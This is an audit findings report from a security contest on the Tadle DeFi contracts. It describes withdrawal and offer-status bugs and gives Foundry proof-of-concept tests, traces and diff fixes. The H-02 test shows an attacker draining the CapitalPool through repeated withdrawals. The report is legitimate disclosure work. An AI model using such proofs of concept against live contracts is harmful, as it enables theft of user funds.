# Tadle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Missing ERC20 Approval in `TokenManager::withdraw` Function Prevents Users from Withdrawing ERC20 Tokens](#H-01) - 0.02 USD
    - ### [H-02. Missing user balance update after withdrawal in `TokenManager` contract letting user withdraw more than they deposit, draining fund from the protocol](#H-02) - 0.00 USD
    - ### [H-03. Incorrect Token Address Argument in `TokenManager::_transfer` Causes Native Token Withdrawal Failure](#H-03)

- ## Low Risk Findings
    - ### [L-01. Maker can call `PreMarkets::closeOffer` on existing offer even there's taker, causing taker's fund to be stuck in the protocol.](#L-01) - 18.35 USD
    - ### [L-02. `PreMarkets::createTaker` function can only be created for `Virgin` offer, prevents multiple takers for the same offer](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: Tadle

### Dates: Aug 6th, 2024 - Aug 13th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-08-tadle)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 3
- Medium: 0
- Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Missing ERC20 Approval in `TokenManager::withdraw` Function Prevents Users from Withdrawing ERC20 Tokens            



## Summary

The `TokenManager::withdraw` function fails to ensure that the TokenManager contract has approval from the CapitalPool to transfer ERC20 tokens. This prevents users from successfully withdrawing their ERC20 tokens from the contract.

## Vulnerability Details

In the `TokenManager::withdraw` function, there's an attempt to transfer ERC20 tokens from the `CapitalPool` to the user without obtaining the necessary approval. This results in failed withdrawals due to insufficient allowance.

```Solidity
  function withdraw()
    {
        ...
        if (_tokenAddress == wrappedNativeToken) {
            ...
        } else {
            /**
             * @dev token is ERC20 token
             * @dev transfer from capital pool to msg sender
             */
            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }
        ...
    }
```

The vulnerability is due to the absence of an approval step before the `_safe_transfer_from` call for ERC20 tokens. For a successful withdrawal, the `CapitalPool` must approve the `TokenManager` to transfer tokens on its behalf. This approval is missing in the current implementation.

**Proof of Code**

Add the following test to the `PreMarkets.t.sol` contract to demonstrate the issue:

```Solidity
  function test_withdraw_ERC20() public {
        vm.startPrank(user);

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        preMarktes.closeOffer(stockAddr, offerAddr);

        vm.expectRevert(Rescuable.TransferFailed.selector);
        tokenManager.withdraw(
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );

        vm.stopPrank();
    }
```

This test demonstrates that the withdrawal fails due to the missing approval.

```Solidity
  ├─ [0] VM::expectRevert(TransferFailed())
    │   └─ ← [Return] 
    ├─ [8862] UpgradeableProxy::withdraw(MockERC20Token: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 4)
    │   ├─ [8343] TokenManager::withdraw(MockERC20Token: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 4) [delegatecall]
    │   │   ├─ [534] TadleFactory::relatedContracts(4) [staticcall]
    │   │   │   └─ ← [Return] UpgradeableProxy: [0x76006C4471fb6aDd17728e9c9c8B67d5AF06cDA0]
    │   │   ├─ [2963] MockERC20Token::transferFrom(UpgradeableProxy: [0x76006C4471fb6aDd17728e9c9c8B67d5AF06cDA0], 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 12000000000000000 [1.2e16])
    │   │   │   └─ ← [Revert] ERC20InsufficientAllowance(0x6891e60906DEBeA401F670D74d01D117a3bEAD39, 0, 12000000000000000 [1.2e16])
    │   │   └─ ← [Revert] TransferFailed()
    │   └─ ← [Revert] TransferFailed()
    ├─ [0] VM::stopPrank()
```

## Impact

The vulnerability prevents users from withdrawing their ERC20 tokens from the CapitalPool through the TokenManager contract. As a result, user funds remain locked in the CapitalPool, and the withdrawal functionality for ERC20 tokens is non-operational.

## Tools Used

* Manual review
* Foundry

## Recommendations

Implement an approval mechanism for the `TokenManager` to spend tokens on behalf of the `CapitalPool` before attempting the transfer:

```diff
function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
        ...
        if (_tokenAddress == wrappedNativeToken) {
            ...
        } else {
    
            /**
             * @dev token is ERC20 token
             * @dev transfer from capital pool to msg sender
             */
+           ICapitalPool(capitalPoolAddr).approve(address(_tokenAddress));

            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }
    }
```

## <a id='H-02'></a>H-02. Missing user balance update after withdrawal in `TokenManager` contract letting user withdraw more than they deposit, draining fund from the protocol            



## Summary

The `TokenManager` contract allows users to withdraw more tokens than they have deposited or are entitled to. This is due to the contract failing to update the user's balance after a withdrawal.

## Vulnerability Details

The withdraw function in the TokenManager contract does not update the user's balance after a successful withdrawal. This allows a user to call the withdraw function multiple times, each time withdrawing their full balance, even though they should only be able to withdraw once.

In `TokenManager::withdraw` function:

```Solidity
function withdraw(
    address _tokenAddress,
    TokenBalanceType _tokenBalanceType
) external whenNotPaused {
    uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
        _tokenAddress
    ][_tokenBalanceType];

    if (claimAbleAmount == 0) {
        return;
    }

    // ... (withdrawal logic)

    emit Withdraw(
        _msgSender(),
        _tokenAddress,
        _tokenBalanceType,
        claimAbleAmount
    );
}
```

`TokenManager::_transfer` function

```Solidity
    function _transfer(
        address _token,
        address _from,
        address _to,
        uint256 _amount,
        address _capitalPoolAddr
    ) internal {
        uint256 fromBalanceBef = IERC20(_token).balanceOf(_from);
        uint256 toBalanceBef = IERC20(_token).balanceOf(_to);

        if (
            _from == _capitalPoolAddr &&
            IERC20(_token).allowance(_from, address(this)) == 0x0
        ) {
            ICapitalPool(_capitalPoolAddr).approve(address(this));
        }

        _safe_transfer_from(_token, _from, _to, _amount);

        uint256 fromBalanceAft = IERC20(_token).balanceOf(_from);
        uint256 toBalanceAft = IERC20(_token).balanceOf(_to);

        if (fromBalanceAft != fromBalanceBef - _amount) {
            revert TransferFailed();
        }

        if (toBalanceAft != toBalanceBef + _amount) {
            revert TransferFailed();
        }
    }
```

**Proof of code**

Add the follow code in `PreMarkets.t.sol`.

Note: Please note that this test case depends on the `withdraw` function being implemented correctly. The current implementation has an additional flaw where the approval step is missing, preventing the withdrawal process from completing successfully.

```Solidity
   function test_userCanWithdrawMultipleTimes() public {
        address attacker = makeAddr("attacker");

        uint256 initialAttackerBalance = 1 ether;
        vm.deal(attacker, initialAttackerBalance);
        /// 1st user create offer with 1 ether
        vm.prank(attacker);
        preMarktes.createOffer{value: 1 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(weth9),
                1000,
                1 * 1e18,
                12000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        /// 2nd user create offer with 1 ether
        vm.prank(user1);
        preMarktes.createOffer{value: 1 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(weth9),
                1000,
                1 * 1e18,
                12000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        // Initial balance check
        uint256 initialPoolBalance = weth9.balanceOf(address(capitalPool));
        assertEq(initialPoolBalance, 2 ether, "Capital pool should have 2 ETH");

        // First offer stock and offer addresses
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        /// user close offer
        vm.startPrank(attacker);
        preMarktes.closeOffer(stockAddr, offerAddr);

        /// User withdraw the fund twice
        tokenManager.withdraw(address(weth9), TokenBalanceType.MakerRefund);
        tokenManager.withdraw(address(weth9), TokenBalanceType.MakerRefund);

        uint256 balanceAfterWtithdraw = weth9.balanceOf(address(capitalPool));

        vm.stopPrank();

        assertEq(balanceAfterWtithdraw, 0, "Capital pool should have 0 ETH");
        assert(attacker.balance > initialAttackerBalance);
    }
```

Test passed indicating

1. Attacker can withdraw twice
2. No more funds left in the `CapitalPool`
3. Attacker gains more funds than deposited

```Solidity
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.32ms (853.54µs CPU time)
```

## Impact

This vulnerability allows users to withdraw more tokens than they have deposited or earned, potentially leading to the complete depletion of the contract's funds. It undermines the entire system's financial integrity, causing direct financial losses for both the protocol and other users

## Tools Used

* Manual review
* Foundry

## Recommendations

Update the user token balance state after the withdrawal

```diff
function withdraw(address _tokenAddress, TokenBalanceType _tokenBalanceType) external whenNotPaused {
    // ... (existing code)
    // Update user balance
+  userTokenBalanceMap[_msgSender()][_tokenAddress][_tokenBalanceType] = 0;
    // ... (rest of the function)
}
```

## <a id='H-03'></a>H-03. Incorrect Token Address Argument in `TokenManager::_transfer` Causes Native Token Withdrawal Failure            



## Summary

The `TokenManager::_transfer` internal function passes an incorrect argument to the `ICapitalPool::approve` function, causing native token withdrawals to fail. Result in user funds being locked in the contract.

## Vulnerability Details

The `TokenManager::_transfer` function attempts to approve the `TokenManager` for spending tokens from the `CapitalPool`. However, it passes the wrong address to the `CapitalPool::approve` function:

In `TokenManager.sol` contract:

```Solidity
    function _transfer() internal {
        ...

        if (
            _from == _capitalPoolAddr &&
            IERC20(_token).allowance(_from, address(this)) == 0x0
        ) {
            ICapitalPool(_capitalPoolAddr).approve(address(this));
        }

        _safe_transfer_from(_token, _from, _to, _amount);

        ...
    }
```

The `CapitalPool::approve` expects a token address as an argument:

In `CapitalPool.sol` contract:

```Solidity
    function approve(address tokenAddr) external {
        address tokenManager = tadleFactory.relatedContracts(
            RelatedContractLibraries.TOKEN_MANAGER
        );

        // approve the token for token manager with max value
        (bool success, ) = tokenAddr.call(
            abi.encodeWithSelector(
                APPROVE_SELECTOR,
                tokenManager,
                type(uint256).max
            )
        );

        if (!success) {
            revert ApproveFailed();
        }
    }
```

The vulnerability arises because `TokenManager::_transfer` passes `address(this)` (the TokenManager's address) instead of the token address to `ICapitalPool::approve`.

**Proof of code**
Add the following function into the `PreMarkets.t.sol` contract to demonstrate the issue:

```Solidity
function test_with_native_eth() public {
        vm.startPrank(user);

        preMarktes.createOffer{value: 0.02 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(weth9),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        preMarktes.closeOffer(stockAddr, offerAddr);

        vm.expectRevert();
        tokenManager.withdraw(address(weth9), TokenBalanceType.MakerRefund);

        vm.stopPrank();
    }
```

The test execution trace shows the failure.

```Solidity
    │   │   ├─ [9999] UpgradeableProxy::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39])
    │   │   │   ├─ [4983] CapitalPool::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39]) [delegatecall]
    │   │   │   │   ├─ [534] TadleFactory::relatedContracts(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39]
    │   │   │   │   ├─ [708] UpgradeableProxy::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─ [192] TokenManager::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] ApproveFailed()
    │   │   │   └─ ← [Revert] ApproveFailed()
```

Shows that the withdrawal fails due to the incorrect argument passed to the `ICapitalPool::approve` function.

## Impact

This vulnerability prevents users from withdrawing native tokens. When a user attempts to withdraw native tokens, the transaction will revert due to the failed approval process. This effectively locks user funds in the contract, rendering a withdrawal feature of the platform inoperable.

## Tools Used

* Manual review
* Foundry

## Recommendations

Modify the `TokenManager::_transfer` function to pass the correct token address:

```diff
function _transfer() internal {
    ...
    if (
        _from == _capitalPoolAddr &&
        IERC20(_token).allowance(_from, address(this)) == 0x0
    ) {
-       ICapitalPool(_capitalPoolAddr).approve(address(this));
+       ICapitalPool(_capitalPoolAddr).approve(_token);
    }
    _safe_transfer_from(_token, _from, _to, _amount);
    ...
}
```

    


# Low Risk Findings

## <a id='L-01'></a>L-01. Maker can call `PreMarkets::closeOffer` on existing offer even there's taker, causing taker's fund to be stuck in the protocol.            



## Summary

The `PreMarkets::closeOffer` function allows makers to close offers with active takers, causing the takers' funds to be stuck in the protocol. This issue arises from the `createTaker` function not updating the offer status from `Virgin` to `Ongoing` after a taker is created.

## Vulnerability Details

The `createTaker` function did not update the offer status from `Virgin` after a taker `createTaker`. This allows `closeOffer` to be called on offers with takers, causing their funds to be stuck in the protocol.

In `PreMarkets::createTaker` function:

```Solidity
function createTaker(address _offer, uint256 _points) external payable {
    ...
    OfferInfo storage offerInfo = offerInfoMap[_offer];
    
    if (offerInfo.offerStatus != OfferStatus.Virgin) {
        revert InvalidOfferStatus();
    }
    
    ...
    
    offerInfo.usedPoints = offerInfo.usedPoints + _points;
    
    ...
}
```

The function updates `usedPoints` but doesn't change the offer status from `Virgin` to `Ongoing`, allowing `closeOffer` to be called with takers.

**Proof of code**
Add this test to `PreMarkets.t.sol`:

```Solidity
    function test_offerCanBeClosedWithTakers() public {
        /// 1st user create offer
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                1 * 1e18,
                10000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        address stockAddr = GenerateAddress.generateStockAddress(0);

        vm.stopPrank();

        /// 2nd user create taker
        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createTaker(offerAddr, 500);
        preMarktes.createTaker(offerAddr, 200);
        vm.stopPrank();

        /// 1st user can close offer
        vm.startPrank(user);
        preMarktes.closeOffer(stockAddr, offerAddr);
        vm.stopPrank();
    }
```

## Impact

When a maker closes an offer with active takers, the takers' funds will be permanently stuck in the protocol. There is no mechanism for takers to withdraw their funds after an offer is closed, resulting in direct financial loss for the takers.

## Tools Used

* Manual review
* Foundry

## Recommendations

Update offer status after a taker is created:

```diff
function createTaker(address _offer, uint256 _points) external payable {
    ...
    OfferInfo storage offerInfo = offerInfoMap[_offer];
    
    if (offerInfo.offerStatus != OfferStatus.Virgin) {
        revert InvalidOfferStatus();
    }
    
    ...
    
    offerInfo.usedPoints = offerInfo.usedPoints + _points;
+   offerInfo.offerStatus = OfferStatus.Ongoing;
    ...
}
```

## <a id='L-02'></a>L-02. `PreMarkets::createTaker` function can only be created for `Virgin` offer, prevents multiple takers for the same offer            



## Summary

The `PreMarkets::createTaker` function only allows interaction with offers in `Virgin` status, effectively limiting each offer to a single taker. This behavior contradicts the existence of an `Ongoing` state in the `OfferStatus::OfferStatus` enum.

## Vulnerability Details

The `createTaker` function only allows interactions with `Virgin` offers:

```Solidity
function createTaker(address _offer, uint256 _points) external payable {
    // ...
    OfferInfo storage offerInfo = offerInfoMap[_offer];
    
    if (offerInfo.offerStatus != OfferStatus.Virgin) {
        revert InvalidOfferStatus();
    }
}
```

The OfferStatus enum defines multiple states, including Ongoing:

```Solidity
/**
 * @dev Offer status
 * @notice Unknown, Virgin, Ongoing, Canceled, Filled, Settling, Settled
 * @param Unknown offer not yet exist.
 * @param Virgin offer has been listed, but not one trade.
 * @param Ongoing offer has been listed, and already one trade.
 * @param Canceled offer has been canceled.
 * @param Filled offer has been filled.
 * @param Settling offer is settling.
 * @param Settled offer has been settled, the last status.
 */
enum OfferStatus {
    Unknown,
    Virgin,
    Ongoing,
    Canceled,
    Filled,
    Settling,
    Settled
}
```

The points tracking mechanism in `PreMarkets::createTaker` function shows that protocol allows multiple takers to interact with a single offer.

`PreMarktes::createTaker` function:

```Solidity
function createTaker(address _offer, uint256 _points) external payable {
    ...

    if (offerInfo.points < _points + offerInfo.usedPoints) {
        revert NotEnoughPoints(
            offerInfo.points,
            offerInfo.usedPoints,
            _points
        );
    }

    ...
}
```

## Impact

The limitation to a single taker per offer contradicts the existence of the `Ongoing` state in the `OfferStatus` enum. Taker will not be able to create another taker for the same offer, preventing the offer to be fully filled.

## Tools Used

* Manual review
* Foundry

## Recommendations

Update the `createTaker` function to allow interactions with offers in the `Ongoing` state:

```diff
function createTaker(address _offer, uint256 _points) external payable {
    ...
    
-   if (offerInfo.offerStatus != OfferStatus.Virgin) {
+  if (offerInfo.offerStatus != OfferStatus.Virgin && offerInfo.offerStatus != OfferStatus.Ongoing) {
        revert InvalidOfferStatus();
    }
    ...
}
```



